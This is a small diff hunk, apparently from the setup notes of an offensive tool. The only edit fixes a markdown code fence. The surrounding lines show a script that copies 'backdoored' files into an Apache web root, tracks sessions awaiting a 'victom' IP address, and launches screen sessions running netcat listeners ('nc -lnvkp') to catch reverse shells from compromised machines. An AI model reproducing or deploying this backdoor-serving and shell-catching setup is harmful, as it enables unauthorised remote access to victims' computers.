@@ -29,7 +29,8 @@ cp backdoored/$dir /var/www/html/out/$dir
 echo "\nPutting $rp session //need ip address from victom here" >> /var/www/html/list_screens_go_to_what
 ## NEED SCREEN AND netcat-openbsd packages (sudo apt-get install netcat-openbsd) as default nc does not have the -k flag
 screen -S L_$rp -d -m \'nc -lnvkp $rp\'
-#screen -ls #debugging```
+#screen -ls #debugging
+```
 
 PHP Configuration:
 	I use apache2 with PHP5
